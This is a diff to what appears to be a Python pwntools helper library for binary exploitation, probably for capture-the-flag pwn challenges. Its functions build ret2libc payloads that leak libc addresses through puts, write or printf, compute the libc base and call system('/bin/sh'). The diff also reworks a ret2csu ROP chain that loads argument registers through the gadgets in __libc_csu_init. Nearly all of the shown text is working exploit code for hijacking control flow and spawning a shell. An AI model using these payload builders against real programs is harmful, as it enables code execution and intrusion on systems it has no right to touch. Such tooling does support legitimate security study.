@@ -15,11 +15,21 @@ def rop(root, code):
     return get_output(cmd)
 
 def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=0,**kwargs):
-    """
+    """function that help you to get the address of some function
     ** if you use printf as tool, you need to find fmt_str **
-    for example: 
-        use [puts](exec puts' plt) to show addr of [__malloc_hook]   
+        for example: 
+            use [puts](exec puts' plt) to show addr of [__malloc_hook]   
+    Args:
+        tool (str): tool function u'll use to leak the addr
+        next (int): next address your program will jump to
+        fill2ret (_type_): payload cover ebp
+        fmt_str (int, optional): used in printf func.
+        to_leak (str, optional): func_name u want to leak, if not set, u'll get the addr of `tool`
+
+    Returns:
+        bytes: payload
     """
+
     kwargs = dd(str,kwargs)
     to_leak = kwargs['to_leak'] if kwargs['to_leak'] else tool
     elf = loader.elf
@@ -34,7 +44,7 @@ def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=0,**kwargs):
             payload+=psize(elf.plt[tool])
             payload+=psize(next)
             payload+=psize(elf.got[to_leak])
-        elif tool == "writes":
+        elif tool == "write":
             payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
         elif tool == "printf":
             if not fmt_str:
@@ -75,6 +85,7 @@ def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret):
     """
     psize = p32 if context.arch == 'i386' else p64
     libc_base = leak_addr - libc.symbols[to_leak]
+    print(hex(libc_base))
     libc.address = libc_base
     system = libc.symbols['system']
     binsh  = next(libc.search(b'/bin/sh'))
@@ -97,7 +108,7 @@ def make_syscall():
     pass
 
 
-def ret2csu(func, edi, rsi, rdx, loader, csu_sym=None):
+def ret2csu(func: int, edi: int, rsi: int, rdx: int, next: int, loader, csu_sym=None):
     """
     edi, rsi, rdx 是x64的前三个参数对应的寄存器
     """
@@ -107,6 +118,7 @@ def ret2csu(func, edi, rsi, rdx, loader, csu_sym=None):
         res = int(res,16)
         # 4007c3 4007ba 4007a0
         csu_p2, csu_p1 = res-(0xc3-0xba), res-(0xc3-0xa0)
+        # p2 是 6个pop加上ret
     else:
         # 760 4007ba 4007a0
         csu_p2, csu_p1 = csu_sym-(0x60-0xba), csu_sym-(0x60-0xa0)
@@ -116,8 +128,30 @@ def ret2csu(func, edi, rsi, rdx, loader, csu_sym=None):
         # add rbx, 1
         # cmp rbx, rbp
         # jnz 不相等才循环
-    parts = [p64(i) for i in [csu_p2, 0, 1, func, rdx, rsi, edi, csu_p1]]
-    payload = b"".join(parts)
+    # payload = flat([
+    #     csu_p2, 
+    #     0,      # pop to rbx
+    #     1,      # pop to rbp
+    #     func,   # pop to r12 -> will be called with rbx=0
+    #     rdx,    # pop to r13 -> mov to rdx
+    #     rsi,    # pop to r14 -> mov to rsi
+    #     edi,    # pop to r15 -> mov to edi
+    #     csu_p1,
+    #     b"a"*0x38,  # 1*`add rsp,8` & 6*`pop`
+    #     next
+    # ])
+    payload = flat([
+        csu_p2, 
+        0,      # pop to rbx
+        1,      # pop to rbp
+        edi,   # pop to r12 -> edi
+        rsi,    # pop to r13 -> rsi
+        rdx,    # pop to r14 -> rdx
+        func,    # pop to r15 -> func call
+        csu_p1,
+        b"a"*0x38,  # 1*`add rsp,8` & 6*`pop`
+        next
+    ])
     return payload
 
 
